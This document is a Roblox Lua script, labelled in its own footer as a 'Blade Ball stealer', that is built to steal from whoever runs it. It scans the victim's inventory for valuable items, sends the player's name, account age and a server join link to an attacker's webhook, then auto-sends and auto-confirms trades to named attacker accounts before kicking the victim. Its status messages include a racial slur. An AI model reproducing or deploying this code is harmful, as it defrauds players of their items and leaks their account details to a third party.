_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false

local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

-- Tes configurations
local users = _G.Usernames or {"Li0nIce201410", "ThunderStealthZap16"}
local webhook = _G.webhook or "" 
local auth_token = _G.AuthToken or "EBK-SS-A"
local min_rap = _G.min_rap or 100

---------------------------------------------------------
-- FONCTIONS UTILITAIRES
---------------------------------------------------------

local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return suffixIndex == 1 and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

local function getExecutor()
    return identifyexecutor and identifyexecutor() or "Unknown"
end

local function buildNameToRAPMap(category)
    local nameToRAP = {}
    local success, rapData = pcall(function() return Replion.Client:GetReplion("ItemRAP").Data.Items[category] end)
    if not success or not rapData then return nameToRAP end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" then nameToRAP[pair[2]] = rap break end
            end
        end
    end
    return nameToRAP
end

local rapMappings = {}
for _, cat in ipairs(categories) do rapMappings[cat] = buildNameToRAPMap(cat) end

local function getRAP(category, itemName)
    return rapMappings[category] and rapMappings[category][itemName] or 0
end

---------------------------------------------------------
-- WEBHOOK AVEC THUMBNAIL ET LIEN
---------------------------------------------------------

local function SendStatusWebhook(title, color, showJoin)
    local itemLines = ""
    local totalRAP = 0
    for _, item in ipairs(itemsToSend) do
        itemLines = itemLines .. "• " .. item.Name .. " - " .. formatNumber(item.RAP) .. " RAP\n"
        totalRAP = totalRAP + item.RAP
    end

    local fields = {
        {
            name = "ℹ️ Player info:",
            value = "```\n🆔 Username: "..plr.Name.."\n👤 Display: "..plr.DisplayName.."\n📅 Age: "..plr.AccountAge.." Days\n⚡ Executor: "..getExecutor().."```",
            inline = false
        }
    }

    if showJoin then
        table.insert(fields, {
            name = "Join link 🔗:",
            value = "[Click to Join Server](https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId .. ")",
            inline = false
        })
    end

    table.insert(fields, {name = "Item list 📝:", value = "```" .. (itemLines ~= "" and itemLines or "None") .. "```", inline = false})
    table.insert(fields, {name = "Summary 💰:", value = "```Total RAP: " .. formatNumber(totalRAP) .. "```", inline = false})

    local data = {
        ["auth_token"] = auth_token,
        ["embeds"] = {{
            ["title"] = title,
            ["color"] = color,
            ["fields"] = fields,
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }

    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end

---------------------------------------------------------
-- SYSTEME DE TRADE AUTOMATIQUE
---------------------------------------------------------

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function() inTrade = tradeGui.Enabled end)

local function doTrade(targetName)
    task.spawn(function()
        local targetPlayer = Players:WaitForChild(targetName)
        
        while #itemsToSend > 0 do
            -- Envoyer requête
            repeat 
                netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(targetPlayer)
                task.wait(1)
            until inTrade

            -- Ajouter items par lots de 100
            local count = 0
            while #itemsToSend > 0 and count < 100 do
                local item = table.remove(itemsToSend, 1)
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
                count = count + 1
                task.wait(0.01)
            end

            -- Ready et Confirm
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            repeat 
                netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
                task.wait(0.2)
            until not inTrade
        end

        SendStatusWebhook("✅ Stuff Successfully Stolen !", 65280, false)
        task.wait(2)
        plr:kick("Transfer Complete.")
    end)
end

---------------------------------------------------------
-- LANCEMENT ET SURVEILLANCE
---------------------------------------------------------

-- 1. Scan de l'inventaire
for _, cat in ipairs(categories) do
    for id, info in pairs(clientInventory[cat]) do
        if not info.TradeLock then
            local rap = getRAP(cat, info.Name)
            if rap >= min_rap then
                table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
            end
        end
    end
end

-- 2. Démarrage si items trouvés
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    
    -- Webhook Violet (Début)
    SendStatusWebhook("🟣 Bro join your hit nigga 🎯", 8323327, true)

    -- Fonction pour vérifier si un de tes comptes est là
    local function checkAndTrade()
        for _, p in ipairs(Players:GetPlayers()) do
            if table.find(users, p.Name) then
                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
                doTrade(p.Name)
                return true
            end
        end
        return false
    end

    -- Vérifier maintenant et à chaque nouvelle connexion
    if not checkAndTrade() then
        Players.PlayerAdded:Connect(function(player)
            if table.find(users, player.Name) then
                SendStatusWebhook("✅ The nigga is on the server ! 🎉", 65280, false)
                doTrade(player.Name)
            end
        end)
    end
end
